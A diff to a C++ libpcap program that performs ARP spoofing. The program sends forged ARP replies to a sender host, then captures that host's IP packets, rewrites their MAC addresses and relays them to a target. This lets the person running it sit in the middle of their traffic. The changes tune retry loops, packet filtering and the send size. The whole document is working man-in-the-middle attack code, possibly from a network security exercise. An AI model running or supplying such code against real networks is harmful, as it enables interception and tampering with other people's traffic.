@@ -249,18 +249,26 @@ int main(int argc, char* argv[]) {
 		EthIpPacket * IP_packet;
 		EthArpPacket * check_arp_tab;
 		int time =0;
+		int fairness=0;
 		while(true){
-			time++;
-			if(time>2){
-				j++;
+			
+				fairness++;
+				if(fairness>4){
+					j++;
 				break;}
+
+			for(int sa=0;sa<3;sa++){
 			int resr = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_reply), sizeof(EthArpPacket));
 			if (resr != 0) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", resr, pcap_geterr(handle));
 			}//arp reply packet send
 			printf("send reply packet to %s\n",sender_IP);
+			}
 
 			while(true){
+				time++;
+				if(time>1000){
+				break;}
 			//get ip packet
 
 		        struct pcap_pkthdr* header;
@@ -274,18 +282,18 @@ int main(int argc, char* argv[]) {
 			//change mac address
 				IP_packet=(struct EthIpPacket *)packet2;
 				check_arp_tab=(struct EthArpPacket *)packet2;
-				if(IP_packet->eth_.smac_==Mac(sender_Mac) && IP_packet->eth_.type_==htons(EthHdr::Ip4)){
+				if(IP_packet->eth_.smac_==Mac(sender_Mac)&&IP_packet->ip_.ip_src.s_addr==htonl(Ip(sender_IP))){
 					IP_packet->eth_.smac_=Mac(my_Mac);
 					IP_packet->eth_.dmac_=Mac(target_Mac);
 					//send ip packet to target
-					int res_t = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(IP_packet), sizeof(EthArpPacket));
+					int res_t = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(IP_packet), sizeof(EthIpPacket));
 					if (res_t != 0) {
 						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_t, pcap_geterr(handle));
 					}
 					printf("send ip packet to target (sender Mac: %s)\n",sender_Mac);
 					}
 			//if arp table change send arp packet again
-				if(check_arp_tab->eth_.type_ == htons(EthHdr::Arp)&&check_arp_tab->arp_.smac_ == Mac(target_Mac)
+				if(check_arp_tab->eth_.type_ == htons(EthHdr::Arp)&&(check_arp_tab->arp_.smac_ == Mac(target_Mac)||check_arp_tab->arp_.tmac_==Mac("00:00:00:00:00:00"))
 				&&check_arp_tab->arp_.op_ == htons(ArpHdr::Reply)){
 						break;
 				}
